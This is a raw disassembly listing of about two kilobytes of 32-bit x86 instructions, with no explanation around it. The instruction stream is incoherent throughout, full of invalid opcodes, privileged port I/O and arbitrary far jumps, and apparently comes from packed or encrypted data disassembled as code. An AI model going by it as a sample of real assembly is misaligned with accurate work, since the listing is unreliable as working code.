  40540e:	repz ror esp,0xf5
  405412:	xchg   ebx,eax
  405413:	sar    dh,1
  405415:	pop    edi
  405416:	mov    bh,0x9a
  405418:	inc    ebx
  405419:	mov    WORD PTR [edx+0x5],cs
  40541c:	(bad)  [ebp+0x6c]
  40541f:	inc    edx
  405420:	inc    ebp
  405421:	shr    BYTE PTR [ebx+0x3],cl
  405424:	(bad)  
  405426:	dec    esi
  405427:	pop    ebx
  405428:	sub    al,0xdc
  40542b:	push   0xc68925af
  405430:	mov    bh,0xd0
  405432:	jl     0x40543b
  405434:	shl    DWORD PTR ds:0x658a8f67,cl
  40543a:	or     DWORD PTR [ecx+0x657f6e51],edx
  405440:	cmp    DWORD PTR [edi+0x51],edi
  405443:	aam    0x97
  405445:	dec    esp
  405446:	mov    dl,dl
  405448:	jl     0x40547f
  40544a:	xor    ebp,DWORD PTR [eax-0x13]
  40544d:	in     al,dx
  40544e:	jg     0x4054ba
  405450:	pop    es
  405451:	xor    dh,BYTE PTR [ebx+eiz*2]
  405454:	or     dl,BYTE PTR [esi+0x6e39adcf]
  40545a:	xchg   edx,eax
  40545b:	icebp  
  40545c:	mov    esi,0xaf0251
  405461:	sbb    ch,ah
  405463:	mul    BYTE PTR [eax-0x7e]
  405466:	dec    edx
  405467:	sub    al,0x9e
  405469:	pop    es
  40546a:	pop    ebp
  40546b:	sub    DWORD PTR [ecx],ebp
  40546d:	cmp    esp,edi
  40546f:	(bad)  
  405471:	enter  0x91d0,0x3d
  405475:	sar    DWORD PTR [ebx],cl
  405477:	dec    ecx
  405478:	adc    DWORD PTR [edx+ebp*4],0xf4e8a0e6
  40547f:	and    eax,0xf02ea40d
  405484:	popf   
  405485:	repnz (bad) cs:[eax]
  405489:	mov    al,ds:0x5302dacf
  40548e:	sub    ebx,edx
  405490:	cmp    DWORD PTR [eax+esi*2-0x24cd237c],edx
  405497:	sbb    ecx,DWORD PTR [edi]
  405499:	push   cs
  40549a:	xchg   edi,eax
  40549b:	call   0xa2d3fc20
  4054a0:	ja     0x405504
  4054a2:	aaa    
  4054a3:	mov    edx,edi
  4054a5:	sub    bh,ch
  4054a7:	aaa    
  4054a8:	mov    fs,WORD PTR [esi]
  4054aa:	(bad)  
  4054ac:	or     al,0x45
  4054ae:	arpl   WORD PTR [ecx+0xc42137],cx
  4054b4:	push   0xcccf6db8
  4054b9:	cmp    eax,0xc7001daf
  4054be:	and    BYTE PTR [esi-0x6c],dl
  4054c1:	mov    ?,ecx
  4054c3:	mov    bh,0x61
  4054c5:	jp     0x4054f5
  4054c7:	dec    esp
  4054c8:	sahf   
  4054c9:	and    bh,al
  4054cb:	push   ebp
  4054cc:	jo     0x40550f
  4054ce:	add    al,0x1c
  4054d0:	cmc    
  4054d1:	or     eax,0x632106b9
  4054d6:	and    edi,DWORD PTR [esi+0x10034373]
  4054dc:	mov    al,ds:0xf2c2fa94
  4054e1:	scas   eax,DWORD PTR es:[edi]
  4054e2:	mov    ah,0x56
  4054e4:	or     al,0xce
  4054e6:	(bad)  
  4054e8:	out    dx,al
  4054e9:	adc    dh,BYTE PTR [ecx+0x71ff1f19]
  4054ef:	mov    ebx,0x9b7a6caa
  4054f4:	mov    eax,ds:0x458adf1
  4054f9:	push   eax
  4054fa:	daa    
  4054fb:	mov    ah,0x45
  4054fd:	jne    0x405529
  4054ff:	lock add eax,0x183193f3
  405505:	popa   
  405506:	xor    eax,0xc909c9a6
  40550b:	fwait
  40550c:	mov    bh,0x2b
  40550e:	(bad)  
  40550f:	cmc    
  405510:	and    BYTE PTR [ebx+ebx*4+0x4e],ah
  405514:	pop    eax
  405515:	mov    eax,0x1685388a
  40551a:	icebp  
  40551b:	and    edx,DWORD PTR [esi+edi*2+0x4d]
  40551f:	str    WORD PTR [edx+0x60]
  405523:	loop   0x4054e9
  405525:	dec    eax
  405526:	or     BYTE PTR [ecx+0x30b1e321],ch
  40552c:	pop    ds
  40552d:	xor    eax,0x1400a5c2
  405532:	mov    al,ds:0xae716043
  405537:	pop    esi
  405538:	adc    eax,0x8011eda7
  40553d:	and    DWORD PTR [ebx+0x2c],ebp
  405540:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405541:	lods   eax,DWORD PTR ds:[esi]
  405542:	inc    edi
  405543:	repz not BYTE PTR [esi-0x72]
  405547:	push   eax
  405548:	nop
  405549:	xor    ah,BYTE PTR [edx-0x16fd26b4]
  40554f:	lods   al,BYTE PTR ds:[esi]
  405550:	ror    BYTE PTR [ebp+0x2a],cl
  405553:	jb     0x4054f9
  405555:	dec    edx
  405556:	sub    BYTE PTR [ecx+0xb],dl
  405559:	std    
  40555a:	stos   DWORD PTR es:[edi],eax
  40555b:	out    0x17,eax
  40555d:	out    dx,eax
  40555e:	loope  0x40559e
  405560:	pushf  
  405561:	xchg   ebp,eax
  405562:	fsubr  QWORD PTR [eax-0x78]
  405565:	adc    esi,DWORD PTR [ebp+0x2664325d]
  40556b:	aam    0xf5
  40556d:	mov    al,0xb7
  40556f:	rcl    eax,0xd8
  405572:	xchg   ebx,eax
  405573:	mov    ds:0x70a40554,al
  405578:	je     0x405505
  40557a:	daa    
  40557b:	add    al,0xc4
  40557d:	retf   0x7e55
  405580:	add    al,0xfc
  405582:	mov    bl,0x40
  405584:	cs adc al,0x8
  405587:	jb     0x405564
  405589:	push   ebp
  40558a:	loope  0x4055a9
  40558c:	popa   
  40558d:	adc    bl,ah
  40558f:	mov    ds:0x91a599ee,al
  405594:	pop    ebp
  405595:	ins    BYTE PTR es:[edi],dx
  405596:	adc    eax,0x8f3ac56d
  40559b:	scas   al,BYTE PTR es:[edi]
  40559c:	cmp    DWORD PTR fs:[ecx+0x133f7e8e],edi
  4055a3:	jne    0x4055cc
  4055a5:	and    eax,0x95f15c86
  4055aa:	call   DWORD PTR [esi-0xd]
  4055ad:	retf   0x5c43
  4055b0:	loop   0x4055ee
  4055b2:	lahf   
  4055b3:	xor    eax,0xe51c9278
  4055b8:	push   eax
  4055b9:	ret    0xad00
  4055bc:	ffreep st(4)
  4055be:	mov    eax,ds:0x6c299a9f
  4055c3:	aam    0xdd
  4055c5:	sub    edi,DWORD PTR ds:0x2c080303
  4055cb:	or     ebx,ecx
  4055cd:	jne    0x405617
  4055cf:	imul   ebp,ebp,0x7b867cbe
  4055d5:	jb     0x40555c
  4055d7:	adc    BYTE PTR [edi+0x35f76300],0x27
  4055de:	jo     0x40561c
  4055e0:	dec    ecx
  4055e1:	xlat   BYTE PTR ds:[ebx]
  4055e2:	(bad)  
  4055e3:	(bad)  
  4055e4:	sbb    ebx,DWORD PTR [esp+ecx*8]
  4055e7:	and    BYTE PTR ds:0xd50a5e6e,bh
  4055ed:	sub    DWORD PTR [ecx+0x636c83ae],0x94e68f16
  4055f7:	jne    0x40566f
  4055f9:	mov    esp,DWORD PTR [edi+0x76614d51]
  4055ff:	cmp    al,BYTE PTR [esi]
  405601:	stos   BYTE PTR es:[edi],al
  405602:	dec    esp
  405603:	adc    BYTE PTR [ebp+0x264de656],ch
  405609:	ins    DWORD PTR es:[edi],dx
  40560a:	in     eax,dx
  40560b:	pop    ds
  40560c:	cmp    al,0x20
  40560e:	jecxz  0x405622
  405610:	mov    ebp,0x64b2b5c2
  405615:	lock mov esp,fs
  405618:	mov    edx,0xf5722c87
  40561d:	pop    ecx
  40561e:	popf   
  40561f:	aas    
  405620:	hlt    
  405621:	cmp    DWORD PTR [edi-0x1d],edx
  405624:	cwde   
  405625:	mov    ch,0xd5
  405627:	ins    DWORD PTR es:[edi],dx
  405628:	jo     0x40566a
  40562a:	push   eax
  40562b:	xchg   ebp,eax
  40562c:	mov    edi,0xeb469561
  405631:	nop
  405632:	push   esp
  405633:	loope  0x405612
  405635:	add    eax,0x414c3e07
  40563a:	mov    ds:0xc808e0,eax
  40563f:	pusha  
  405640:	jbe    0x4056b9
  405642:	stos   DWORD PTR es:[edi],eax
  405643:	out    0xef,eax
  405645:	mov    cl,0xa0
  405647:	scas   al,BYTE PTR es:[edi]
  405648:	xchg   esp,eax
  405649:	or     cl,BYTE PTR [ecx-0x4dc04db5]
  40564f:	xchg   ebx,eax
  405650:	dec    ebp
  405651:	xchg   esp,eax
  405652:	loopne 0x4055ee
  405654:	call   0xf8d4f829
  405659:	call   0xc49f:0x6341efaa
  405660:	retf   
  405661:	jbe    0x4055f6
  405663:	pop    ecx
  405664:	sub    al,0x86
  405666:	xor    DWORD PTR [ecx-0x63f9915a],ebx
  40566c:	ins    BYTE PTR es:[edi],dx
  40566d:	mov    eax,ds:0xd0ac36e0
  405672:	ret    0x8530
  405675:	out    dx,al
  405676:	mov    ch,0x7c
  405678:	mov    ch,0xbe
  40567a:	add    ebp,esi
  40567c:	xchg   edi,eax
  40567d:	sbb    ebp,edx
  40567f:	jo     0x40568c
  405681:	pop    ebp
  405682:	imul   esp,DWORD PTR [edx],0x60
  405685:	(bad)  
  405686:	adc    dh,cl
  405688:	xchg   esi,eax
  405689:	repnz stos DWORD PTR es:[edi],eax
  40568b:	stos   DWORD PTR es:[edi],eax
  40568c:	les    edx,FWORD PTR [ecx+0x38]
  40568f:	sbb    BYTE PTR [esi+0x6ee303c0],0xa7
  405696:	jae    0x405637
  405698:	dec    DWORD PTR ds:0x7902c0ce
  40569e:	sub    eax,edi
  4056a0:	dec    edx
  4056a1:	fs or  al,0xc5
  4056a4:	daa    
  4056a5:	xchg   edx,eax
  4056a6:	jmp    0x62ea:0x166ef845
  4056ad:	jl     0x40572b
  4056af:	dec    ebx
  4056b0:	lods   eax,DWORD PTR ds:[esi]
  4056b1:	jbe    0x405725
  4056b3:	sub    edi,ecx
  4056b5:	inc    esi
  4056b6:	pop    ebp
  4056b7:	shr    DWORD PTR [edi],1
  4056b9:	(bad)  
  4056ba:	(bad)  [ebp+0x24e4ef42]
  4056c0:	jae    0x405726
  4056c2:	mov    ecx,edx
  4056c4:	and    BYTE PTR [ebp+0x2a601dbd],ch
  4056ca:	aam    0x85
  4056cc:	stos   DWORD PTR es:[edi],eax
  4056cd:	mov    edx,0x7d06347
  4056d2:	imul   edi,DWORD PTR [ecx+0x29],0xfffffff4
  4056d6:	push   ecx
  4056d7:	fdivrp st(3),st
  4056d9:	ins    BYTE PTR es:[edi],dx
  4056da:	push   ss
  4056db:	xor    al,ch
  4056dd:	imul   ebp
  4056df:	fst    QWORD PTR [eax+ebp*4]
  4056e2:	push   cs
  4056e3:	lea    edi,ds:0xa082bdeb
  4056e9:	je     0x405767
  4056eb:	fstp   QWORD PTR [esi+ebp*8]
  4056ee:	inc    ecx
  4056ef:	inc    BYTE PTR [edi]
  4056f1:	add    al,0xcd
  4056f3:	push   eax
  4056f4:	or     al,0xbe
  4056f6:	aaa    
  4056f7:	lods   al,BYTE PTR ds:[esi]
  4056f8:	sub    eax,0x9215ebbc
  4056fd:	lock fstp DWORD PTR [ecx+0x51]
  405701:	popf   
  405702:	mov    edx,0x6c0d8208
  405707:	cmp    ecx,eax
  405709:	xchg   DWORD PTR [esi-0x48],esp
  40570c:	(bad)  
  40570d:	sbb    eax,0x985b615b
  405712:	mov    edi,0xc517b54
  405717:	jle    0x4056a0
  405719:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40571a:	ror    BYTE PTR [edi],0xb6
  40571d:	retf   
  40571e:	cli    
  40571f:	lods   eax,DWORD PTR ds:[esi]
  405720:	xchg   ebx,eax
  405721:	aad    0x6c
  405723:	sahf   
  405724:	jg     0x405768
  405726:	ret    
  405727:	shr    al,1
  405729:	xor    al,0xf9
  40572b:	fs (bad) 
  40572d:	cwde   
  40572e:	data16 jg 0x405753
  405731:	push   esi
  405732:	mov    esp,0x220699a4
  405737:	call   0xc8e5:0xc98d3bec
  40573e:	fsub   QWORD PTR [esi-0x79]
  405741:	cmp    eax,0xd4de7d0e
  405746:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405747:	and    BYTE PTR [edx-0x5bd68ec],ah
  40574d:	das    
  40574e:	shr    esi,0x3f
  405751:	inc    ebp
  405752:	js     0x405705
  405754:	mov    ds:0x83828f87,al
  405759:	jbe    0x40579e
  40575b:	dec    eax
  40575c:	retf   
  40575d:	pop    edi
  40575e:	push   ecx
  40575f:	push   ebp
  405760:	xchg   edi,eax
  405761:	xchg   edi,eax
  405762:	sar    BYTE PTR [esi-0xd],cl
  405765:	and    bl,BYTE PTR [ebx+0x53]
  405768:	cmp    esp,eax
  40576a:	test   ebx,0x8bb93736
  405770:	loop   0x40574a
  405772:	into   
  405773:	mov    edx,0x614f7509
  405778:	jp     0x4057b6
  40577a:	dec    ebp
  40577b:	leave  
  40577c:	in     eax,dx
  40577d:	or     DWORD PTR [eax+0x60f498fa],0xf9230498
  405787:	fbstp  TBYTE PTR [ebp+0x173ec557]
  40578d:	mov    eax,ds:0x7c3714a1
  405792:	mov    bh,0x1
  405794:	push   ebx
  405795:	ins    DWORD PTR es:[edi],dx
  405796:	dec    edi
  405797:	mov    al,0x9
  405799:	mov    ch,0xc2
  40579b:	jp     0x4057f3
  40579d:	pop    edi
  40579e:	jbe    0x40573f
  4057a0:	in     eax,0x51
  4057a2:	sbb    BYTE PTR [edi-0x6a],ch
  4057a5:	or     DWORD PTR cs:[edi+ebx*4+0x34],edx
  4057aa:	ja     0x4057e6
  4057ac:	pop    ebp
  4057ad:	sbb    eax,0x60b7785f
  4057b2:	pop    eax
  4057b3:	push   esp
  4057b4:	icebp  
  4057b5:	clc    
  4057b6:	loop   0x40582f
  4057b8:	adc    eax,0x4e259a99
  4057bd:	push   edx
  4057be:	and    eax,0xda0cf9ea
  4057c3:	pop    es
  4057c4:	dec    ebx
  4057c5:	leave  
  4057c6:	fsubr  QWORD PTR [eax]
  4057c8:	xor    ah,BYTE PTR [ebx+ebp*4+0x5c9d951b]
  4057cf:	je     0x40583c
  4057d1:	loopne 0x4057ae
  4057d3:	add    al,0x6d
  4057d5:	rcr    DWORD PTR [ebx],cl
  4057d7:	mov    ebp,0x6c349e34
  4057dc:	shufps xmm1,xmm1,0xe9
  4057e0:	ret    0xbb0e
  4057e3:	arpl   WORD PTR [eax+eiz*2],bp
  4057e6:	sbb    ecx,ecx
  4057e8:	xor    DWORD PTR [edi-0x1a],ebx
  4057eb:	push   DWORD PTR [esi+0x47]
  4057ee:	or     eax,0x53d74b9d
  4057f3:	inc    eax
  4057f4:	jns    0x4057e2
  4057f6:	leave  
  4057f7:	cmp    al,0xce
  4057f9:	dec    eax
  4057fa:	mov    ah,0x1
  4057fc:	and    ebp,ebp
  4057fe:	or     al,0x16
  405800:	scas   eax,DWORD PTR es:[edi]
  405801:	inc    edx
  405802:	dec    ecx
  405803:	pop    es
  405804:	int    0x45
  405806:	repnz cs shl dh,cl
  40580a:	js     0x4057a0
  40580c:	pusha  
  40580d:	mov    bl,0xe2
  40580f:	or     BYTE PTR [edi+ebp*1],bl
  405812:	call   0x77c45340
  405817:	(bad)  
  405818:	pop    ss
  405819:	(bad)  
  40581a:	out    0x62,eax
  40581c:	aaa    
  40581d:	mov    eax,ds:0x35c0b09a
  405822:	pop    esi
  405823:	xor    al,0xc0
  405825:	pop    ebx
  405826:	dec    ecx
  405827:	add    DWORD PTR [ecx-0x523e628b],ebp
  40582d:	push   esp
  40582e:	inc    ebx
  40582f:	push   ecx
  405830:	pop    ds
  405831:	push   eax
  405832:	add    dh,BYTE PTR [ebx]
  405834:	jae    0x405869
  405836:	pushf  
  405837:	xchg   BYTE PTR ds:0xf110,ah
  40583c:	ss jmp 0xc9b4:0xbf4364d0
  405844:	pop    ds
  405845:	(bad)  
  405847:	sar    DWORD PTR [ebx],0xed
  40584a:	push   eax
  40584b:	je     0x4058ac
  40584d:	cld    
  40584e:	adc    eax,0x77d6da4d
  405853:	push   ecx
  405854:	xchg   ebp,eax
  405855:	sbb    DWORD PTR [edx],edx
  405857:	ss std 
  405859:	icebp  
  40585a:	shr    DWORD PTR [ecx-0x59],1
  40585d:	push   ebp
  40585e:	lock inc esp
  405860:	(bad)  
  405861:	push   esi
  405862:	packssdw mm2,QWORD PTR [ebp+0x18]
  405866:	push   ds
  405867:	stos   BYTE PTR es:[edi],al
  405868:	push   es
  405869:	adc    DWORD PTR [edx],0xffffffa9
  40586c:	mov    dh,0x47
  40586e:	xor    BYTE PTR [esi+edi*8-0x49],bh
  405872:	adc    eax,DWORD PTR [ebx-0x3f88d4d6]
  405878:	mov    al,0x1f
  40587a:	mov    edi,DWORD PTR [edi]
  40587c:	lds    ecx,FWORD PTR [eax+0x57]
  40587f:	xor    ah,BYTE PTR [eax+0x1e]
  405882:	jg     0x405817
  405884:	adc    BYTE PTR [ebx+0x1e36c47],dl
  40588a:	jl     0x405860
  40588c:	sahf   
  40588d:	ja     0x40585a
  40588f:	mov    al,ds:0xfdccb842
  405894:	repnz stos DWORD PTR es:[edi],eax
  405896:	nop
  405897:	fidiv  DWORD PTR [edi-0x6b]
  40589a:	fld    TBYTE PTR [esi]
  40589c:	js     0x405874
  40589e:	shr    DWORD PTR [edi],1
  4058a0:	sar    cl,1
  4058a2:	in     al,dx
  4058a3:	stc    
  4058a4:	fadd   DWORD PTR [ebx+0x3e1afe69]
  4058aa:	gs test al,0x6a
  4058ad:	enter  0x4ef4,0xf
  4058b1:	mul    BYTE PTR cs:[edi]
  4058b4:	or     dh,BYTE PTR [esi-0x7b]
  4058b7:	push   cs
  4058b8:	xchg   DWORD PTR [ecx+0x6fe4a43b],ebx
  4058be:	cmp    DWORD PTR [ebx],esp
  4058c0:	sbb    eax,0x7bf7bd73
  4058c5:	push   edx
  4058c6:	out    0x43,al
  4058c8:	adc    al,0x47
  4058ca:	add    al,0x5e
  4058cc:	les    eax,FWORD PTR [esi]
  4058ce:	sub    DWORD PTR [ecx],esp
  4058d0:	fwait
  4058d1:	scas   al,BYTE PTR es:[edi]
  4058d2:	stos   BYTE PTR es:[edi],al
  4058d3:	not    DWORD PTR [edx]
  4058d5:	loopne 0x40585d
  4058d7:	mov    ebx,0x165afdb8
  4058dc:	or     cl,BYTE PTR [ebx]
  4058de:	mov    edi,0xf4237e0a
  4058e3:	imul   esp,DWORD PTR [ecx-0x34],0x23b48e43
  4058ea:	cmp    edx,DWORD PTR [eax-0x4c3c4fc4]
  4058f0:	clc    
  4058f1:	pop    ds
  4058f2:	dec    ebp
  4058f3:	scas   al,BYTE PTR es:[edi]
  4058f4:	pop    es
  4058f5:	js     0x40594b
  4058f7:	push   ebp
  4058f8:	and    DWORD PTR [eax-0x24a8d703],esp
  4058fe:	xor    DWORD PTR [ebp+0x18],ecx
  405901:	jle    0x40594e
  405903:	add    DWORD PTR [ebx+0x22625a44],ecx
  405909:	mov    cl,dh
  40590b:	int3   
  40590c:	add    BYTE PTR [edx],bh
  40590e:	pop    esp
  40590f:	pop    edi
  405910:	xchg   esp,eax
  405911:	ds mov eax,0xd6156693
  405917:	sbb    cl,BYTE PTR [esi+0x29]
  40591a:	int    0xe9
  40591c:	neg    BYTE PTR [esi]
  40591e:	jnp    0x40592b
  405920:	aad    0xe8
  405922:	data16 ror BYTE PTR [esi],0xa5
  405926:	push   esi
  405927:	test   eax,0xbf95e655
  40592c:	mov    ebx,0xb7e4bab9
  405931:	mov    esi,0xa00b2df
  405936:	aaa    
  405937:	xchg   edx,eax
  405938:	(bad)  [eax-0x3cafd43a]
  40593e:	ins    DWORD PTR es:[edi],dx
  40593f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405940:	xchg   ecx,eax
  405941:	jnp    0x40599f
  405943:	sub    BYTE PTR [ecx+0xb],cl
  405946:	outs   dx,DWORD PTR ds:[esi]
  405947:	out    dx,al
  405948:	and    ecx,esp
  40594a:	in     al,0x7e
  40594c:	and    dh,BYTE PTR [edi]
  40594e:	cmp    DWORD PTR [ebx+0x26],edi
  405951:	mov    ebp,0x61ba6b6a
  405956:	scas   eax,DWORD PTR es:[edi]
  405957:	out    0x9b,al
  405959:	or     DWORD PTR [eax-0x3c],ebp
  40595c:	pop    eax
  40595d:	popf   
  40595e:	shl    DWORD PTR ds:0x2a116fb4,0x89
  405965:	inc    ebx
  405966:	or     ah,BYTE PTR [edi-0x56c96c79]
  40596c:	dec    esi
  40596d:	nop
  40596e:	xor    BYTE PTR [ebx+0x4a3260a8],cl
  405974:	inc    eax
  405975:	lods   al,BYTE PTR ds:[esi]
  405976:	dec    esp
  405977:	(bad)  
  405978:	mov    esp,0x656d0216
  40597d:	xchg   esp,eax
  40597e:	push   es
  40597f:	test   eax,0xd2ef8f36
  405984:	shl    DWORD PTR [edx+0x22715c63],cl
  40598a:	call   0x65dc:0xa3a01044
  405991:	mov    ecx,0x4a22a7ed
  405996:	jno    0x4059c0
  405998:	or     edi,DWORD PTR [esi+0x97a6be9]
  40599e:	test   al,0x81
  4059a0:	dec    eax
  4059a1:	sbb    eax,0xe0b9521b
  4059a6:	ins    BYTE PTR es:[edi],dx
  4059a7:	shl    BYTE PTR [edi-0x69b822a8],0x54
  4059ae:	cli    
  4059af:	adc    DWORD PTR [edx],esp
  4059b1:	mov    ds:0x2ada3f9,al
  4059b6:	std    
  4059b7:	jne    0x405952
  4059b9:	fild   WORD PTR [ebx]
  4059bb:	dec    edi
  4059bc:	test   eax,0xaa39c0c1
  4059c1:	int3   
  4059c2:	mov    ds:0x17d7d713,al
  4059c7:	adc    eax,0xbddb179b
  4059cc:	mov    eax,0xc231dbd0
  4059d1:	inc    edx
  4059d2:	push   ebp
  4059d3:	mov    bh,0x28
  4059d5:	pop    esi
  4059d6:	int    0x9c
  4059d8:	push   edi
  4059d9:	mov    WORD PTR [esi+0xbfb8244],fs
  4059df:	imul   ebp,esp,0xffffffa7
  4059e2:	out    0xa2,al
  4059e4:	mov    edi,DWORD PTR [esi+eiz*4+0x2c7d8e16]
  4059eb:	add    ecx,DWORD PTR ds:[eax]
  4059ee:	aad    0x5f
  4059f0:	or     DWORD PTR [ebx-0x11],ebx
  4059f3:	enter  0x4dd1,0x5
  4059f7:	mov    WORD PTR ds:0x9f754cf3,es
  4059fd:	out    0xee,eax
  4059ff:	rol    BYTE PTR [ebx-0x5d2115d6],0xa0
  405a06:	sub    eax,0xe90cfe6f
  405a0b:	inc    eax
  405a0c:	jmp    0x235c:0xaa780b0b
  405a13:	cmc    
  405a14:	popf   
  405a15:	xor    DWORD PTR [ebx-0x1],ebx
  405a18:	push   ecx
  405a19:	or     eax,0xbee02ea
  405a1e:	(bad)  
  405a1f:	cld    
  405a20:	sbb    ah,BYTE PTR [bp+si-0x43e2]
  405a25:	sub    DWORD PTR [edx-0x7a],edx
  405a28:	and    esp,DWORD PTR ds:0x300e1366
  405a2e:	in     al,0x8f
  405a30:	add    edi,ecx
  405a32:	inc    eax
  405a33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a34:	inc    ebx
  405a35:	popa   
  405a36:	inc    eax
  405a37:	stos   DWORD PTR es:[edi],eax
  405a38:	and    dl,BYTE PTR [edx-0x65]
  405a3b:	aam    0xa9
  405a3d:	rcl    ebp,0xf3
  405a40:	cmp    ebp,DWORD PTR [ebx-0x5702a47d]
  405a46:	push   ebx
  405a47:	xchg   ebp,eax
  405a48:	inc    esi
  405a49:	xchg   edi,eax
  405a4a:	xor    eax,0x6772a603
  405a4f:	push   esp
  405a50:	jmp    0x405a07
  405a52:	pushf  
  405a53:	mov    edi,DWORD PTR [esp+ebp*2+0x7]
  405a57:	dec    esp
  405a58:	dec    esp
  405a59:	repz push ss
  405a5b:	mov    edi,0x3fe33c8
  405a60:	adc    eax,0xb0e17947
  405a65:	mov    bl,0xca
  405a67:	sub    BYTE PTR [edx-0x787d2690],al
  405a6d:	mov    al,0x12
  405a6f:	cmp    edx,DWORD PTR [ecx]
  405a71:	jmp    0xba14:0xa05667c6
  405a78:	(bad)  
  405a79:	jmp    0x405a74
  405a7b:	ror    bl,cl
  405a7d:	dec    ebx
  405a7e:	push   es
  405a7f:	adc    DWORD PTR [edx-0x57],0x34
  405a83:	cs fs out 0xe1,eax
  405a87:	gs mov esi,0x2a4955e5
  405a8d:	pop    ebx
  405a8e:	inc    esp
  405a8f:	adc    al,0x60
  405a91:	pop    ebx
  405a92:	add    bl,BYTE PTR [ebp+edi*1+0x2]
  405a96:	push   0x9ddd9c04
  405a9b:	cmc    
  405a9c:	das    
  405a9d:	in     al,0x1f
  405a9f:	pushf  
  405aa0:	sub    dl,BYTE PTR [esp-0x5c57dad6]
  405aa7:	fiadd  WORD PTR [eax+eiz*2]
  405aaa:	inc    esi
  405aab:	dec    eax
  405aac:	test   BYTE PTR [ebx+esi*1],cl
  405aaf:	into   
  405ab0:	adc    DWORD PTR [eax+0x8],0xe69cd3e6
  405ab7:	mov    dh,0x1c
  405ab9:	push   ebx
  405aba:	mov    cl,BYTE PTR [ecx-0x14d229e9]
  405ac0:	clc    
  405ac1:	cmp    DWORD PTR [eax],esi
  405ac3:	clc    
  405ac4:	call   0xbecf:0x3535d940
  405acb:	xor    DWORD PTR [esi+0x74],ebx
  405ace:	sub    BYTE PTR [esi],0x7c
  405ad1:	mov    esi,0x18b590ef
  405ad6:	or     BYTE PTR [edx+0x5],bl
  405ad9:	repnz cmp eax,DWORD PTR [ebx-0x3ef2757d]
  405ae0:	lods   eax,DWORD PTR ds:[esi]
  405ae1:	adc    ch,ah
  405ae3:	xchg   BYTE PTR [ebp+0x62f31afb],ch
  405ae9:	mov    dl,dl
  405aeb:	cmp    DWORD PTR [ecx-0xa],eax
  405aee:	sub    eax,0x51a34ab1
  405af3:	loopne 0x405abd
  405af5:	int    0x6d
  405af7:	add    eax,0x3ef2a7a8
  405afc:	rol    ecx,1
  405afe:	loope  0x405ad3
  405b00:	call   0x2b1ae54a
  405b05:	sub    eax,DWORD PTR ds:0x2da952cf
  405b0b:	sub    dh,dl
  405b0d:	push   0xffffffd0
  405b0f:	out    0x1b,eax
  405b11:	jg     0x405ac8
  405b13:	pusha  
  405b14:	scas   al,BYTE PTR es:[edi]
  405b15:	dec    edi
  405b16:	aad    0x9d
  405b18:	inc    ecx
  405b19:	cmp    ecx,ebp
  405b1b:	and    DWORD PTR [ebp-0x51628f06],ebp
  405b21:	mov    ecx,0x19075bb8
  405b26:	add    esp,DWORD PTR [esi+0x4eec6a68]
  405b2c:	lock jo 0x405b69
  405b2f:	fs jns 0x405ad8
  405b32:	fistp  DWORD PTR [edi]
  405b34:	jmp    0x4a3d:0x7b99cbd2
  405b3b:	aaa    
  405b3c:	enter  0xcb05,0x1e
  405b40:	mov    DWORD PTR [edx+0x6717ce65],eax
  405b46:	xchg   esp,eax
  405b47:	add    BYTE PTR [esi+eiz*2+0x7fc0996],cl
  405b4e:	push   ecx
  405b4f:	mov    esi,0xcba63ac4
  405b54:	xor    BYTE PTR [esp+edi*8+0x7b160960],ah
  405b5b:	jmp    0x405bbc
  405b5d:	dec    ebp
  405b5e:	in     eax,dx
  405b5f:	fwait
  405b60:	mov    bh,0xca
  405b62:	mov    bh,0x60
  405b64:	pop    es
  405b65:	cdq    
  405b66:	ins    DWORD PTR es:[edi],dx
  405b67:	in     al,0xd5
  405b69:	gs xor eax,0xc0c1e096
  405b6f:	inc    eax
  405b70:	cdq    
  405b71:	lds    edi,FWORD PTR [eax+0x7807f46f]
  405b77:	leave  
  405b78:	and    bh,bl
  405b7a:	int3   
  405b7b:	std    
  405b7c:	xchg   esi,eax
  405b7d:	mov    ch,0xe
  405b7f:	sbb    al,0xd2
  405b81:	mov    ch,0xf1
  405b83:	mov    bh,0x18
  405b85:	cwde   
  405b86:	xchg   edi,eax
  405b87:	ja     0x405b37
  405b89:	sub    ecx,DWORD PTR [esi-0x75]
  405b8c:	fadd   st,st(2)
  405b8e:	sub    dl,ch
  405b90:	add    ch,dl
  405b92:	popf   
  405b93:	jnp    0x405c04
  405b95:	jo     0x405b58
  405b97:	clc    
  405b98:	in     eax,0xb6
  405b9a:	mov    al,0xa7
  405b9c:	scas   al,BYTE PTR es:[edi]
  405b9d:	mov    dl,0x73
  405b9f:	fwait
  405ba0:	pop    ss
  405ba1:	mov    dl,0x43
  405ba3:	pop    es
  405ba4:	jno    0x405bad
  405ba6:	mov    bh,0x77
  405ba8:	out    dx,eax
  405ba9:	out    0x5b,eax
  405bab:	cmp    cl,ch
  405bad:	push   0x5f6d0908
  405bb2:	std    
  405bb3:	push   esp
  405bb4:	test   BYTE PTR [ecx],bl
  405bb6:	add    dh,bh
  405bb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405bb9:	add    dh,BYTE PTR [eax]
  405bbb:	or     al,BYTE PTR [edx-0x3]
  405bbe:	pop    ds
  405bbf:	shr    cl,0x18
  405bc2:	out    dx,al
  405bc3:	dec    esi
  405bc4:	(bad)  
  405bc5:	xchg   edi,eax
  405bc6:	cwde   
  405bc7:	pop    ebx
  405bc8:	shr    esi,cl
  405bca:	test   eax,0x5ddbda76
  405bcf:	xchg   esi,eax
  405bd0:	or     al,0xf4
  405bd2:	or     BYTE PTR [ecx+0x70907a4],cl
  405bd8:	das    
  405bd9:	stos   DWORD PTR es:[edi],eax
  405bda:	jg     0x405c2b
  405bdc:	pop    ecx
  405bdd:	inc    esp
  405bde:	sar    DWORD PTR cs:[ebx-0x143d6db0],1
  405be5:	fld    DWORD PTR [ebx+0x365709d7]
  405beb:	call   0x257ecd50
  405bf0:	jns    0x405b83
  405bf2:	mov    ebp,DWORD PTR [edx+0x144d402a]
  405bf8:	je     0x405bc5
  405bfa:	xchg   ebp,eax
  405bfb:	push   ecx
  405bfc:	sbb    DWORD PTR [esi+0x3],ebp
  405bff:	pop    ss
  405c00:	outs   dx,DWORD PTR ds:[esi]
  405c01:	in     eax,dx
  405c02:	fwait
  405c03:	(bad)  
  405c04:	loope  0x405bdc
